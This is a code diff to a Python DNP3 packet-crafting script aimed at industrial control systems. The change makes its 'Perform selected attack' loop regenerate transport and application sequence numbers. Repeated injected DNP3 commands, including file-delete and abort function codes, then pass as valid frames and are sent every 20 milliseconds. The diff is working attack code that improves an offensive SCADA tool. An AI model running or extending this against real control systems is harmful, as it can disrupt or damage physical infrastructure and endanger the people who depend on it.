@@ -12,7 +12,7 @@ import binascii
 from ctypes import c_ushort
 
 "Constants"
-sendOnly = True
+sendOnly = False
 sequenceT = 191
 sequenceA = 191
 Confirm = "\x00"
@@ -46,6 +46,8 @@ Delete_File = "\x1B"
 Get_Info = "\x1C"
 Auth_File = "\x1D"
 Abort_File = "\x1E"
+
+''''''
 
 class CRC16DNP(object):
 	crc16dnp_tab = []
@@ -1298,7 +1300,6 @@ def custum_payload():
 	except TypeError:
 		control = dnp3_control()
 	'''
-	tmp = T_seq()
 	data ,function_check, = dnp3_function()
 
 	print "what user choose : " ,function_check
@@ -1307,13 +1308,20 @@ def custum_payload():
 	else:
 		group_check = set_group(function_check-1)
 		data += group_check
-		data = T_seq()  + A_seq() + data + Variation(function_check-1,group_check) + qulifier_code(function_check-1,group_check) + num_item()
+		#use for mutilpy run 
+		
+		nonSeqPayload = data + Variation(function_check-1,group_check) + qulifier_code(function_check-1,group_check) + num_item()
+		data = T_seq()  + A_seq() + nonSeqPayload
 	total_cnt = len(data) + 5
 	header = "\x05\x64"+ chr(total_cnt)+"\xc4"+Source_Dest()
 	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
-	return packet
-
+	return packet , header , nonSeqPayload
 ''''''
+
+def update_seq(header,nonSeqPayload):
+	payload = T_seq() + A_seq() + nonSeqPayload
+	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), payload, struct.pack('>H', CRC16DNP().calculate(payload)))
+	return packet
 
 ''' for fun '''
 def custum_control():
@@ -1417,11 +1425,12 @@ if __name__ == "__main__":
 	''' Perform selected attack '''
 
 	i = 0
-	packet=dnp3_packet
+	packet,header,nonSeqPayload=dnp3_packet
 	print ''
 
 	while (i < attack_count):
 		send_dnp3_packet(mysocket,packet)
+		packet = update_seq(header,nonSeqPayload)
 		i=i+1
 		time.sleep(0.02) #Time lapse between packets (in seconds)
 		print 'Sent' , i , 'repetitions...'
